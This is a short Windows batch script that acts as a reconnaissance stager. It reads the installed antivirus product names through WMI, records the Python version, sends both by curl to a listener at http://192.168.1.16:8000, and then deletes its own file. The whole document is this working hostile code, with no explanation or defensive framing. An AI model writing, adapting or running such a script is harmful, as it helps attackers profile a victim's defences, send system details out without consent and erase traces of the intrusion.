@echo off
setlocal enabledelayedexpansion
for /f "delims=" %%a in ('wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName ^| findstr /r /v "^$"') do (
    set "antivirus=!antivirus! %%a"
)
for /f "delims=" %%b in ('python --version 2^>^&1') do (
    set "python_version=%%b"
)
curl --verbose --get --data-urlencode "Antivirus=!antivirus!" --data-urlencode "PythonVersion=!python_version!" http://192.168.1.16:8000
del "%~f0"
